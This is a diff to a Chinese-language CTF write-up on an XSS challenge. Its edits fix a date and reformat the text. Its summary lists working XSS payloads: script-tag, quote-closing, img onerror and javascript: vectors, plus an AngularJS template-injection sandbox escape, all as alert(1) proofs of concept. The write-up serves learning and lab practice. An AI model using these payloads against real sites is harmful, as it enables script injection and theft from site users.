@@ -1,6 +1,6 @@
 ---
 Author: SuperJason
-Date: 2020-12-120
+Date: 2020-12-20
 ---
 
 ## flag
@@ -64,19 +64,21 @@ if(getQueryVariable('autosubmit') !== false){
 		       return(false);
 		}
 ```
-7. level6，AngularJS模板注入  
+7. level6，AngularJS模板注入，参考资料：[AngularJS模板注入XSS](https://nosec.org/home/detail/4153.html)   
 ![](./images/xss-4.png)
-    参考资料：[AngularJS模板注入XSS](https://nosec.org/home/detail/4153.html)  
-获得payload：`?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
+
+获得payload：  
+`?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
 
 ## 总结
 XSS的考察点
 - 基础  
 `<script>alert(1)</script>`
-- 闭合，用`'`闭合前面的`'`，`//`注释掉后面的参数  `username=xss';alert(1);//`
+- 闭合，用`'`闭合前面的`'`，`//`注释掉后面的参数  
+`username=xss';alert(1);//`
 - 不存在的img源  
 `<img src=1 onerror=alert(1)>`
 - Javascript伪协议  
 `javascript:alert(1)`
-- 都无解的情况下，考虑模板注入`{{3*3}}`，此处为AngularJS模板注入
+- 都无解的情况下，考虑模板注入`{{3*3}}`，此处为AngularJS模板注入  
 `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
